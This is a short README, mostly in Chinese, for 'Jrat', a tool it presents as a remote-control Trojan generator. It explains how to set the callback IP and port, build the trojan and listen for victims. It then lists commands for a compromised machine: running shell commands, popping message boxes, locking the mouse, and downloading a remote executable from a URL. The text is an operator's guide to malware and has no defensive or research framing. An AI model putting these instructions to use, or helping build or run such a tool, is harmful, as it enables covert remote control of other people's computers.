# Jrat
Jrat is a remote control Trojan horse generator.<br>
使用方法：<br>
在“Jrat>>”阶段可用的命令有：lhost（上线IP），lport（上线端口），port（监听端口），save（生成木马），run（开始监听）<br>
例如：Jrat>> lhost 127.0.0.1    Jrat>> lport 8808    Jrat>> port 8808    Jrat>> save    Jrat>> run<br>
以上步骤是生成一个连接到127.0.0.1，端口为8808的木马，然后开始监听8808端口并等待木马上线<br>
木马上线后，程序来到第二阶段“Command>>”阶段，此阶段中可用的命令有：shell+cmd命令，msgbox+提示信息，clip+true/false（锁定/解锁鼠标），download+link+name（远程下载文件）<br>
例如：Command>> shell start C:    Command>> msgbox Hello World!    Command>> clip true    Command>> download http://baidu.com/1.exe 1.exe<br>
上述命令时，先打开C盘，然后弹出一个对话窗口，显示“Hello World!”，接着鼠标被锁住，最后远程下载一个链接为“http://baidu.com/1.exe”的文件<br>
